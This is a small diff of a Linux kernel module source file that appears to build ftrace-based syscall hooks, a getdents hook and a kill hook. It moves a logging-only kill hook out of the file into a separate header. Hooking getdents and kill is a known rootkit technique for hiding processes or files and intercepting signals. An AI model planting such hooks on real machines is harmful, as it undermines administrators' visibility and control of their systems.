@@ -15,24 +15,8 @@
 
 #include "helpers.h" // todo add include protection in header
 #include "getdents_hook.h"
+#include "kill_hook.h"
 
-
-///////////////////////////////////////////// OLD SECTION TO HOOK KILL REMOVE IT
-
-// TODO dont forget PTREGS macro
-static asmlinkage long (*orig_kill)(const struct pt_regs*);
-
-asmlinkage int hook_kill(const struct pt_regs* regs)
-{
-
-    /// do some logic before calling original function
-    pid_t pid = regs->di;
-    int sig = regs->si;
-    pr_info("IN PTREGS pid is %d, sig is %d\n", pid, sig);
-
-    return orig_kill(regs);
-
-}
 
 // define which functions to hook
 static struct ftrace_hook hooks[] = {
